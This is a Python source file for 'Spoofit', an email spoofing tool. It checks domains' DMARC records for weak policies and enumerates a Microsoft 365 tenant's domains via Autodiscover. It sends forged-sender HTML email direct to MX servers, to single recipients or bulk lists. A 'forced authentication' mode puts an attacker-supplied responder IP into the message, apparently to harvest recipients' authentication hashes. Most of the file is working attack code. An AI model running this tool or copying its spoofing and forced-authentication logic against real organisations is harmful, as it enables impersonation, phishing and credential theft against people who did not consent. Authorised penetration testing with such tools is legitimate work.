#!/usr/bin/env python3
import smtplib
import dns.resolver
import argparse
import os
import configparser
import xml.etree.ElementTree as ET
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
import csv
import tldextract

def print_banner():
    banner = r"""
   _____                   _____ __ 
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_  
/____/ .___/\____/\____/_/ /_/\__/  
    /_/                             
   """
    print(banner)

def get_domain_from_email(email):
    return email.split('@')[1]

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_record = min(answers, key=lambda r: r.preference).exchange.to_text()
        return mx_record
    except Exception as e:
        print(f"[!] Error retrieving MX record for {domain}: {e}")
        return None

def send_email(mx_record, sender, recipient, subject, body):
    """
    Attempts direct-to-MX delivery of an email.
    """
    try:
        with smtplib.SMTP(mx_record, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"[!] Failed to send email to {recipient}: {msg}")
                return
            server.data(
                f"To: {recipient}\r\n"
                f"From: {sender}\r\n"
                f"Subject: {subject}\r\n"
                f"Content-Type: text/html\r\n\r\n{body}"
            )
            print(f"[+] Email sent to {recipient}")
    except smtplib.SMTPRecipientsRefused:
        print(f"[!] Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"[!] Error sending email to {recipient}: {e}")

def load_config(forced=False):
    """
    Loads configuration from 'conf/spoofit.conf'.
    If forced=True, loads forced authentication subject/body.
    Otherwise loads standard spoof email subject/body.
    """
    config = configparser.ConfigParser()
    config_file = 'conf/spoofit.conf'
    if not os.path.exists(config_file):
        print(f"[!] Configuration file {config_file} does not exist.")
        return None

    config.read(config_file)
    if forced:
        subject = config.get('ForcedAuthEmail', 'subject')
        body_file = config.get('ForcedAuthEmail', 'body_file')
        with open(body_file, 'r') as file:
            body = file.read()
    else:
        subject = config.get('Email', 'subject')
        body = config.get('Email', 'body')
    return subject, body

def create_forced_auth_email(body_template, responder_ip):
    """
    Inserts the responder IP into the forced auth email body template.
    """
    return body_template % {'responder': responder_ip}

def is_subdomain(domain):
    """
    Returns True if 'domain' is a subdomain (i.e. not the org domain).
    """
    extracted = tldextract.extract(domain)
    org_domain = f"{extracted.domain}.{extracted.suffix}"
    return domain.lower() != org_domain.lower()

def check_spoofability(domain):
    """
    Checks if 'domain' can be spoofed based on DMARC:
    - If p=reject => not spoofable
    - If p=quarantine => partial (Doubtful)
    - If p=none or no DMARC => likely spoofable
    - Subdomain logic: if org domain has sp=reject/quarantine => enforced
      else subdomain is unprotected
    """
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    result = {"domain": domain, "policy": "", "spoofable": False}

    try:
        # Attempt to retrieve a DMARC record for the domain
        try:
            dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            dmarc_record = str(dmarc_answer[0]).lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            dmarc_record = None

        if dmarc_record:
            # We have a direct DMARC record for this domain
            if "p=reject" in dmarc_record:
                print(f"{RED}[-] Spoofing not possible for {domain}: DMARC p=reject (fully enforced).{RESET}")
                result["policy"] = "p=reject (fully enforced)"
            elif "p=quarantine" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=quarantine for {domain} (partial).{RESET}")
                result["policy"] = "p=quarantine (partial)"
                result["spoofable"] = True
            elif "p=none" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=none for {domain} (not enforced).{RESET}")
                result["policy"] = "p=none (not enforced)"
                result["spoofable"] = True
            else:
                print(f"{YELLOW}[!] DMARC record found for {domain} but unknown p= tag.{RESET}")
                result["policy"] = "No recognized p= (treat as none)"
                result["spoofable"] = True
        else:
            # No DMARC at the domain => check if subdomain
            extracted = tldextract.extract(domain)
            org_domain = f"{extracted.domain}.{extracted.suffix}"
            if org_domain.lower() == domain.lower():
                print(f"{YELLOW}[!] No DMARC for {domain}.{RESET}")
                result["policy"] = "No record"
                result["spoofable"] = True
            else:
                # Subdomain => check if org domain has sp=...
                try:
                    org_dmarc = dns.resolver.resolve(f"_dmarc.{org_domain}", "TXT")
                    org_record = str(org_dmarc[0]).lower()
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    org_record = None

                if org_record:
                    sp_tag = ""
                    for token in org_record.split():
                        if token.startswith("sp="):
                            sp_tag = token.split("=", 1)[1]
                            break

                    if sp_tag == "reject":
                        print(f"{RED}[-] {domain} has no DMARC, but {org_domain} has sp=reject => subdomain protected.{RESET}")
                        result["policy"] = "sp=reject (org domain)"
                    elif sp_tag == "quarantine":
                        print(f"{YELLOW}[!] {domain} no DMARC, {org_domain} sp=quarantine => partial subdomain.{RESET}")
                        result["policy"] = "sp=quarantine (org domain)"
                        result["spoofable"] = True
                    else:
                        if "p=reject" in org_record:
                            print(f"{YELLOW}[!] {domain} no DMARC; {org_domain} p=reject but no sp= => subdomain not enforced.{RESET}")
                            result["policy"] = "No sp= (org p=reject)"
                            result["spoofable"] = True
                        elif "p=quarantine" in org_record:
                            print(f"{YELLOW}[!] {domain} no DMARC; {org_domain} p=quarantine but no sp= => sub partial.{RESET}")
                            result["policy"] = "No sp= (sub partial)"
                            result["spoofable"] = True
                        else:
                            print(f"{YELLOW}[!] No DMARC for {domain}, no sp= => subdomain unprotected.{RESET}")
                            result["policy"] = "No sp= (sub unprotected)"
                            result["spoofable"] = True
                else:
                    print(f"{YELLOW}[!] No DMARC for {domain} and no DMARC for {org_domain}.{RESET}")
                    result["policy"] = "No record (org none)"
                    result["spoofable"] = True

        # After we've determined if it's spoofable, print the final "spoofing" line with nuance
        if result["spoofable"]:
            # If policy indicates 'quarantine', mention spam
            if "quarantine" in result["policy"].lower():
                print(f"{YELLOW}[+] Spoofing might slip through if spam is recovered.{RESET}")
            else:
                # If it's a subdomain => "maybe", else => "spoofing possible"
                if is_subdomain(domain):
                    print(f"{YELLOW}[!] Spoofing might be possible for subdomain: {domain}{RESET}")
                else:
                    print(f"{GREEN}[+] Spoofing possible for {domain}.{RESET}")
        else:
            # If we concluded not spoofable, we do not print a "spoofing possible" line
            pass

    except Exception as e:
        print(f"[!] Error checking spoofability for {domain}: {e}")
        result["policy"] = "Error"

    return result

def autodiscover_endpoint(domain):
    if domain.lower().endswith(".gov"):
        return "https://autodiscover-s.office365.us/autodiscover/autodiscover.svc"
    return "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"

def enumerate_tenant_domains(domain):
    body = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages"
        xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types"
        xmlns:a="http://www.w3.org/2005/08/addressing"
        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <soap:Header>
            <a:RequestedServerVersion>Exchange2010</a:RequestedServerVersion>
            <a:MessageID>urn:uuid:1234abcd-9e05-465e-ade9-aae14c4bcd10</a:MessageID>
            <a:Action soap:mustUnderstand="1">
              http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation
            </a:Action>
            <a:To soap:mustUnderstand="1">
              {autodiscover_endpoint(domain)}
            </a:To>
            <a:ReplyTo>
                <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
            </a:ReplyTo>
        </soap:Header>
        <soap:Body>
            <GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
                <Request>
                    <Domain>{domain}</Domain>
                </Request>
            </GetFederationInformationRequestMessage>
        </soap:Body>
    </soap:Envelope>"""
    headers = {"Content-Type": "text/xml; charset=utf-8", "User-Agent": "AutodiscoverClient"}
    url = autodiscover_endpoint(domain)

    try:
        request = Request(url, data=body.encode(), headers=headers)
        with urlopen(request) as response:
            xml_data = response.read().decode()
    except (HTTPError, URLError) as e:
        print(f"[!] Error performing Autodiscover: {e}")
        return []

    domains_found = []
    try:
        root = ET.fromstring(xml_data)
        namespace = "{http://schemas.microsoft.com/exchange/2010/Autodiscover}"
        for elem in root.iter():
            if elem.tag == f"{namespace}Domain":
                if elem.text and elem.text.strip():
                    domains_found.append(elem.text.strip())
    except Exception as e:
        print(f"[!] Error parsing Autodiscover XML: {e}")
        return []
    return list(set(domains_found))

def print_summary_table(dmarc_results):
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
    if not filtered:
        print("[!] No domains to display in summary table (all onmicrosoft?).")
        return

    print("\nFinal DMARC Summary (excluding .onmicrosoft.com):")
    print("-" * 100)
    print(f"{'Domain':<34} | {'DMARC Policy':<32} | {'Spoofing Possible'}")
    print("-" * 100)

    for res in filtered:
        domain = res["domain"]
        policy = res["policy"]
        if res["spoofable"]:
            if "quarantine" in policy.lower():
                spoof_str = "Doubtful"
            else:
                if is_subdomain(domain):
                    spoof_str = f"{YELLOW}Maybe{RESET}"
                else:
                    spoof_str = f"{GREEN}Yes{RESET}"
        else:
            spoof_str = "No"

        print(f"{domain:<34} | {policy:<32} | {spoof_str}")
    print("-" * 100 + "\n")

def export_results_csv(dmarc_results, filename):
    filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
    if not filtered:
        print(f"[!] No results to export to {filename} (all onmicrosoft?).")
        return
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Domain", "DMARC Policy", "Spoofing Possible"])
            for r in filtered:
                domain = r["domain"]
                policy = r["policy"]
                if r["spoofable"]:
                    if "quarantine" in policy.lower():
                        spoof = "Doubtful"
                    else:
                        if is_subdomain(domain):
                            spoof = "Maybe"
                        else:
                            spoof = "Yes"
                else:
                    spoof = "No"
                writer.writerow([domain, policy, spoof])
        print(f"[+] Exported DMARC results to {filename}")
    except Exception as e:
        print(f"[!] Error exporting to {filename}: {e}")

def parse_tenant_name(domains, fallback_domain):
    onmicrosoft = [d for d in domains if d.lower().endswith(".onmicrosoft.com")]
    if onmicrosoft:
        raw = onmicrosoft[0].lower()
        raw = raw.replace(".onmicrosoft.com", "")
        raw = raw.split('.', 1)[0]
        return f"{raw}_spoofit_results.csv"
    else:
        return fallback_domain.replace('.', '_') + "_spoofit_results.csv"

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="DMARC-Focused Email Spoofing Tool.",
        epilog="""
Examples:

  1) Check domain:
     Spoofit.py -d domain.com

  2) Check entire tenant (auto-saves CSV):
     Spoofit.py -d domain.com -t

  3) Send a spoofed email (single recipient):
     Spoofit.py -s sender@domain.com -r recipient@domain.com

  4) Send a spoofed email (multiple recipients from file):
     Spoofit.py -s sender@domain.com -r recipients.txt

  5) Forced authentication:
     Spoofit.py -s sender@domain.com -r recipient@domain.com -f responder-ip
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument('-d', '--domain', help='Check spoofability for a domain.')
    parser.add_argument('-t', '--tenant', action='store_true', help='Check entire Microsoft tenant.')
    parser.add_argument('-s', '--sender', help='Spoofed sender email.')
    parser.add_argument('-r', '--recipients', help='Recipient email or file containing list of recipient emails.')
    parser.add_argument('-f', '--forced', metavar='RESPONDER_IP',
                        help='Forced authentication with responder-ip.')

    args = parser.parse_args()
    if not any(vars(args).values()):
        parser.print_help()
        return

    # 1) Domain check logic (DMARC checks)
    if args.domain:
        dmarc_results = []
        domains_to_check = [args.domain]

        if args.tenant:
            all_domains = enumerate_tenant_domains(args.domain)
            csv_filename = parse_tenant_name(all_domains, args.domain)
            tenant_domains = [d for d in all_domains if not d.lower().endswith(".onmicrosoft.com")]
            if tenant_domains:
                print(f"[+] Tenant domains discovered for {args.domain} (excluding .onmicrosoft.com):")
                for dom in tenant_domains:
                    print(f"  - {dom}")
                print("\nRunning DMARC checks on each discovered domain:\n")
                domains_to_check = tenant_domains
            else:
                print("[-] No additional tenant domains found or all .onmicrosoft.com.")
                print(f"Checking only {args.domain}.\n")
                csv_filename = parse_tenant_name([], args.domain)

        for dom in domains_to_check:
            res = check_spoofability(dom)
            dmarc_results.append(res)

        print_summary_table(dmarc_results)

        if args.tenant:
            export_results_csv(dmarc_results, csv_filename)
        return

    # 2) Sending spoofed emails
    if args.recipients and args.sender:
        recipients = []
        if os.path.isfile(args.recipients):
            with open(args.recipients, 'r') as f:
                recipients = [line.strip() for line in f if line.strip()]
        else:
            recipients.append(args.recipients)

        if args.forced:
            cfg = load_config(forced=True)
            if not cfg:
                return
            subject, body_template = cfg
            body = create_forced_auth_email(body_template, args.forced)
            print(f"[*] Sending forced authentication email to {len(recipients)} recipients.")
        else:
            cfg = load_config()
            if not cfg:
                return
            subject, body = cfg
            print(f"...Sending spoofed email to {len(recipients)} recipients.")

        domain = get_domain_from_email(args.sender)
        mx_record = get_mx_record(domain)
        if not mx_record:
            print("[!] Failed to retrieve MX record. Exiting...")
            return

        for rcp in recipients:
            send_email(mx_record, args.sender, rcp, subject, body)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
